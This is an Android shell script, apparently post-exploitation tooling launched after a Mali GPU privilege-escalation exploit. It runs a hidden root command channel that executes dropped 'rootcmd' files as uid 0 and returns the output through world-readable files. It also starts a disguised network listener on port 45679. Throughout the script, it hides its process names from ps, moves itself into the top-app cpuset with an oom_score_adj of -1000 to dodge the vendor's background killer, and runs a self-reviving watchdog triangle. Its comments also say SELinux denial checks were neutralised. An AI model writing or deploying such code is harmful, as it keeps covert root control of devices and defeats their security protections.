#!/system/bin/sh
# Root command channel + watchdog triangle, started by the Mali LPE payload
# (or the modprobe helper).  Polls one or more inbox directories for a file
# named `rootcmd`, runs it as uid 0, appends the output and an `rc=` line to
# `rootout` in the same directory, then renames the request to `rootcmd.done`
# so a stale command is never executed twice.
#
#   rootd.sh                      # default inbox: /data/local/tmp
#   rootd.sh /a /b                # several inboxes
#   ROOTD_PRIMARY=/a rootd.sh /a  # where rootd.pid / the banner go
#
# The multi-inbox form is what the APK build needs: an ordinary app cannot
# write /data/local/tmp, but it can write its own files dir, and once
# avc_denied() is neutralised the root daemon can read that dir too.
#
# EMUI survival (2026-11-04): Huawei's background cleaner (iAware) killed
# rootd+rootsrv+probe in a single sweep ~4 min after boot.  Three counter-
# measures live here and in the caller:
#   - cpuset migration: move out of the app's background cpuset into
#     top-app (all cores) - removes the loudest "background app" signal;
#   - camouflage: rootsrv runs from a copied binary (comm becomes the
#     copy's basename) and this script re-execs from a nondescript copy,
#     so `ps` no longer shows "rootd";
#   - watchdog triangle: rootd revives rootsrv and the watcher; the watcher
#     revives rootd and rootsrv.  One kill is repaired within ~1 s; the
#     channels are lost only if both revivers die in the same instant.
# The probe process is deliberately NOT revived - it holds the hijacked GPU
# page tables and cannot be restarted without a reboot.
#
# PATH matters: when this is started from a usermode helper the kernel hands
# us PATH=/sbin:/usr/sbin:/bin:/usr/bin, and there is nothing useful there on
# Android - no sleep, no mv, no id.  The loop then spins at 100% CPU and every
# rename fails, so the inbox never advances.
export PATH=/system/bin:/system/xbin:${PATH}
PRIMARY=${ROOTD_PRIMARY:-/data/local/tmp}

# pid liveness: kill -0 succeeds iff the pid exists.  NEVER use
# `[ -s /proc/$pid/cmdline ]` here - procfs reports st_size = 0 for every
# /proc file, so that test is *always* false, and the watcher would respawn
# live processes every second until the pid space wraps (this exact bug
# melted the phone on 2026-11-04).
alive() {
	[ -n "$1" ] && kill -0 "$1" 2>/dev/null
}

# Move one pid out of the app's background cpuset.  Huawei groups every
# zygote child by activity state; the chain inherits "background" from the
# app and top-app is both faster (all cores) and far less kill-worthy.
to_topapp() {
	for CG in /dev/cpuset/top-app /dev/stune/top-app; do
		[ -d "$CG" ] && echo "$1" > "$CG/tasks" 2>/dev/null
	done
	echo -1000 > "/proc/$1/oom_score_adj" 2>/dev/null
}

SRCDIR=${ROOTD_SRC:-$(cd "$(dirname "$0")" 2>/dev/null && pwd)}
[ -n "$SRCDIR" ] || SRCDIR=/data/local/tmp
WD="$SRCDIR/.sysd"

# Storm fuse: if a liveness-check bug (or anything else) ever makes respawn
# run away again, refuse to add fuel - the first few instances keep serving,
# the excess exits immediately.
if [ "$1" != "--watch" ]; then
	N=$(pgrep -f 'rootd\.sh|sysd/vmd' 2>/dev/null | wc -l)
	[ -z "$N" ] && N=0
	if [ "$N" -gt 4 ]; then
		echo "storm fuse: $N instances already running, exiting" \
			>&2 2>/dev/null
		exit 0
	fi
fi

if [ "${ROOTD_CAMO:-0}" != "1" ]; then
	# First entry: hide this script's real path from `ps`.  Copy self to a
	# nondescript name and re-exec; ROOTD_SRC keeps the original directory
	# so the watchdog can respawn the original file.
	export ROOTD_SRC="$SRCDIR"
	export ROOTD_CAMO=1
	mkdir -p "$WD" 2>/dev/null
	cp -f "$0" "$WD/vmd" 2>/dev/null
	chmod 755 "$WD/vmd" 2>/dev/null
	if [ -f "$WD/vmd" ]; then
		exec /system/bin/sh "$WD/vmd" "$@"
	fi
	# copy failed (odd filesystem) - fall through uncamouflaged
fi

# ---- watcher mode: the third corner of the triangle ----
#   rootd.sh --watch <rootd-pidfile> <dirs...>
# Keeps *rootd* alive.  rootsrv is revived exclusively by rootd (one writer
# for rootsrv.pid, no double-start race).  Loss case: watcher and rootd die
# in the same instant - then srv keeps serving but unsupervised, and the
# channels die with it.
if [ "$1" = "--watch" ]; then
	shift
	GUARD=$1
	shift
	DIRS="$*"
	(umask 022; echo "$DIRS" > "$PRIMARY/rootd.dirs") 2>/dev/null
	(umask 022; echo $$ > "$PRIMARY/watch.pid") 2>/dev/null
	chmod 644 "$PRIMARY/watch.pid" "$PRIMARY/rootd.dirs" 2>/dev/null
	to_topapp $$
	while true; do
		sleep 1
		RP=$(cat "$GUARD" 2>/dev/null)
		if ! alive "$RP"; then
			export ROOTD_PRIMARY="$PRIMARY"
			# respawn through the camouflaged copy, so the new
			# rootd's argv never contains "rootd" either
			setsid /system/bin/sh "$WD/vmd" $DIRS \
				>/dev/null 2>&1 &
		fi
	done
fi

# ---- main rootd ----
if [ "$#" -gt 0 ]; then
	DIRS="$*"
else
	DIRS="$PRIMARY"
fi
# 0644 on the pid files: the adb-side tooling (run_soak.sh, r) reads them,
# and a root-owned 600 file is unreadable from the shell domain.
(umask 022; echo "$DIRS" > "$PRIMARY/rootd.dirs") 2>/dev/null
(umask 022; echo $$ > "$PRIMARY/rootd.pid") 2>/dev/null
chmod 644 "$PRIMARY/rootd.pid" "$PRIMARY/rootd.dirs" 2>/dev/null
to_topapp $$
echo "rootd up: $(id) dirs=[$DIRS]" >> "$PRIMARY/rootout" 2>/dev/null
chmod 666 "$PRIMARY/rootout" 2>/dev/null
# Marker in every inbox: an unprivileged caller cannot read $PRIMARY (the APK
# is one), but it can read the directory it handed us.
for D in $DIRS; do
	echo "rootd up: $(id)" >> "$D/rootup" 2>/dev/null
	chmod 666 "$D/rootup" 2>/dev/null
done

# rootsrv from a disguised copy: its comm becomes the copy's basename.
# If a previous rootd died but its hid survived (orphaned, still bound),
# ADOPT it instead of starting a competitor that can only fail to bind and
# leave the respawn loop spinning on a port that is never free.
start_srv() {
	AP=$(pgrep -f 'hid 45679' 2>/dev/null | head -1)
	if [ -n "$AP" ]; then
		(umask 022; echo "$AP" > "$PRIMARY/rootsrv.pid") 2>/dev/null
		chmod 644 "$PRIMARY/rootsrv.pid" 2>/dev/null
		to_topapp "$AP"
		return
	fi
	SRVB="$WD/hid"
	if [ ! -f "$SRVB" ]; then
		cp -f "$SRCDIR/rootsrv" "$SRVB" 2>/dev/null
		chmod 755 "$SRVB" 2>/dev/null
	fi
	[ -f "$SRVB" ] || SRVB="$SRCDIR/rootsrv"
	setsid "$SRVB" 45679 >/dev/null 2>&1 &
	(umask 022; echo $! > "$PRIMARY/rootsrv.pid") 2>/dev/null
	chmod 644 "$PRIMARY/rootsrv.pid" 2>/dev/null
	to_topapp $!
}

start_srv

if ! alive "$(cat "$PRIMARY/watch.pid" 2>/dev/null)"; then
	setsid /system/bin/sh "$0" --watch "$PRIMARY/rootd.pid" $DIRS \
		>/dev/null 2>&1 &
fi

while true; do
	for D in $DIRS; do
		[ -f "$D/rootcmd" ] || continue
		( cd "$D" 2>/dev/null || cd /; /system/bin/sh "$D/rootcmd" ) \
			>> "$D/rootout" 2>&1
		echo "rc=$?" >> "$D/rootout" 2>/dev/null
		# The caller deletes rootout before every command, so the file is
		# recreated here with rootd's umask (0600 root:root) and an
		# unprivileged app cannot read the answer back.  /data/local/tmp only
		# works because the startup path chmods it once; do the same per write.
		chmod 666 "$D/rootout" 2>/dev/null
		mv -f "$D/rootcmd" "$D/rootcmd.done" 2>/dev/null
	done
	# keep the triangle closed: revive whichever corner died
	SP=$(cat "$PRIMARY/rootsrv.pid" 2>/dev/null)
	if ! alive "$SP"; then
		start_srv
	fi
	WP=$(cat "$PRIMARY/watch.pid" 2>/dev/null)
	if ! alive "$WP"; then
		setsid /system/bin/sh "$0" --watch "$PRIMARY/rootd.pid" $DIRS \
			>/dev/null 2>&1 &
	fi
	sleep 1
done
